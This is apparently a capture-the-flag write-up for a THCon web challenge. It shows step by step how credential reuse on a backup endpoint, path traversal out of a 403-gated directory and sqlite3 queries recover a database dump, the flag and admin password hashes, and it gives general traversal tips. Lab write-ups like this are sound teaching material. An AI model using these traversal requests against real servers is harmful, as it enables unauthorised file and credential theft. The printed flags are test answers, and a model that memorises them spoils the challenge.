# Panic in the Northern Quadrant — 2

- **Category:** Web
- **Target:** `http://panic-in-the-northern-quadrant.ctf.thcon.party:8080`

```
THC{r4c3d_2_t0p}
```

## TL;DR

- Reuse the credentials from part 1 (`username=sst&password=THC{s3cur3p455}`) to `POST /backup.php`. The endpoint generates a SQLite backup at `/var/www/html/<random_hash>/temp/db.bak` and returns the path in JSON.
- `/download-legacy/` is `403`-gated *for listing* but accepts **path traversal**: `/download-legacy/../<random_hash>/temp/db.bak` serves the file.
- `sqlite3 db.bak "SELECT * FROM units;"` — the flag is the `status` of unit `#1093` (`Titan-v4`), masquerading as a status string.

## 1. Reusing part 1

The same base64 string in the HTML comment decodes to working credentials:

```bash
$ curl -s -X POST http://.../backup.php \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "username=sst&password=THC{s3cur3p455}"
{"status":"ok","path":"/var/www/html/bb7065a9fe72bef7d3c254be68efc0dc/temp/db.bak"}
```

The `path` reveals the hash-named container directory the server uses for transient files. We have a filename. We don't yet have a way to pull it.

## 2. Path traversal at `/download-legacy/`

Direct enumeration of `/download-legacy/` returns `403`:

```bash
$ curl -si http://.../download-legacy/
HTTP/1.1 403 Forbidden
```

The 403 hides the directory but doesn't sanitize traversal *out* of it. With `../` plus the known hash directory:

```bash
$ curl -s -o db.bak \
    "http://.../download-legacy/../bb7065a9fe72bef7d3c254be68efc0dc/temp/db.bak"
$ file db.bak
SQLite 3.x database
```

(Note: this is also a soft race — the backup file is meant to be cleaned up shortly after generation, hence the flag's wording "r4c3d_2_t0p". Calling `/backup.php` and downloading immediately wins easily.)

## 3. Query the dump

```sql
$ sqlite3 db.bak "SELECT * FROM units;"
1|#1092|Interceptor-v1|ACTIVE
2|#1093|Titan-v4|THC{r4c3d_2_t0p}
3|#1094|Phantom-v2|ACTIVE

$ sqlite3 db.bak "SELECT * FROM credentials;"
1|admin    |6e97320f...|superadmin
2|operator |81cb3a0b...|user
```

The flag is the "status" cell of row 2 — a column the backup author didn't expect to be exfiltrated.

The two SHA-256 hashes (`admin`, `operator`) are loose ends for part 3.

## 4. Methodology

- **A `403 Forbidden` listing is not a `403 Forbidden` access.** Apache will routinely allow `GET /forbidden_dir/../<readable_path>` because the access check fires on the prefix, not the canonicalized path. Always test traversal out of any forbidden directory.
- **Backup endpoints that print a path are oracles.** A path in a JSON response tells you the on-disk layout — random-hash directories included. Combine with traversal and you have a download primitive.
- **Dump every table, not just the obvious one.** The flag was hiding in `units.status`, not `flags`/`secrets`. SQLite carving is fast; `.dump` it all.
- **Flag wording is a hint at intended exploit.** "r4c3d_2_t0p" + the temp-file pattern is the author signaling the race condition; even though winning is easy, recognizing the design helps anticipate part 3.
